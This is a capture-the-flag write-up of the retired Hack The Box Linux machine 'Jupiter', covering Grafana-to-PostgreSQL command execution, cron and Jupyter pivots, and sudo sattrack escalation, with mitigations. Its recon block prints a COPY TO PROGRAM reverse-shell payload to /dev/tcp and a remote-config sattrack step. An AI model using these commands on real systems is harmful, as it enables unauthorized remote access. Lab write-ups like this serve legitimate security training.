---
machine: Jupiter
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, grafana, postgresql, copy-program, jupyter, sattrack]
---

# Jupiter — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Grafana allows arbitrary SQL queries against PostgreSQL; `COPY ... FROM PROGRAM` runs commands as `postgres`. A Shadow Simulator cron leads to `juno`, Jupyter to `jovian`, and `sudo sattrack` with a controllable configuration completes the escalation.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80,3000,5432,8888 <IP>
# Grafana -> PostgreSQL datasource
psql -h 127.0.0.1 -U postgres -d postgres
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"';
# Pivot
pspy64 -pf -i 1000
sudo -l
sudo sattrack --config http://<IP>/config.json
```

## Enumeration

- Grafana with a PostgreSQL datasource and raw queries enabled.
- A Shadow Simulator cron with writable configuration files.
- Jupyter reachable with reused credentials and `sattrack` in sudo.

## Initial access

The datasource allows `COPY (SELECT '') TO PROGRAM '...'`; PostgreSQL runs the command as its user. Start a reverse shell and obtain a session as `postgres`.

## Privilege escalation

A Shadow Simulator cron processes a modifiable configuration and runs commands as `juno`. From there, Jupyter executes as `jovian`; `sudo sattrack` accepts a configuration URL and writes to a root path.

## Evidence

- `COPY ... PROGRAM` query executed from Grafana.
- Shell as `postgres` and pivot to `juno`.
- `sudo sattrack` with controlled configuration and root shell.

## Lessons learned

- A SQL datasource can be command execution on the server.
- Crons reading writable configuration are a direct escalation.
- Tools run with `sudo` that accept URLs or files widen the surface.

## Mitigation and detection

- Disable raw queries and limit the PostgreSQL user.
- Mount cron configuration read-only.
- Restrict `sattrack` and validate its configuration sources.

## References

- [0xdf — Jupiter](https://0xdf.gitlab.io/2023/10/21/htb-jupiter.html)
- [PostgreSQL — COPY](https://www.postgresql.org/docs/current/sql-copy.html)
- [Hack The Box — Jupiter](https://app.hackthebox.com/machines/jupiter)
